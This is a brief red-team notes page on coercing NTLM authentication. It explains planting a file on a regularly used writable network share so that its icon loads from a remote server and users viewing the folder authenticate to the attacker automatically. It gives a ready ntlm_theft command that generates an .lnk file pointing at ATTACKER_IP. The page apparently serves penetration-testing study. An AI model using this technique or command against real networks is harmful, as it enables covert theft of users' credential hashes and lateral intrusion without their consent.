---
description: Coercing users into authenticating to us
---

# Coercing

How can we coerce users to authenticate to something we control?&#x20;



* If we have write access to a network file share (that is used regularly),&#x20;
* Create a sneaky little file to coerce those users to authenticate to our server.&#x20;
* We can do this by creating a file that,&#x20;
* when viewed within the file browser, will coerce authentication automatically.&#x20;
* coercing authentication by requesting that an element, such as the file icon, is loaded from a remote location.&#x20;

Tool

We will be using the [ntlm\_theft](https://github.com/Greenwolf/ntlm\_theft) tool to create these documents.

```
python3 ntlm_theft.py -g lnk -s ATTACKER_IP -f stealthy
```
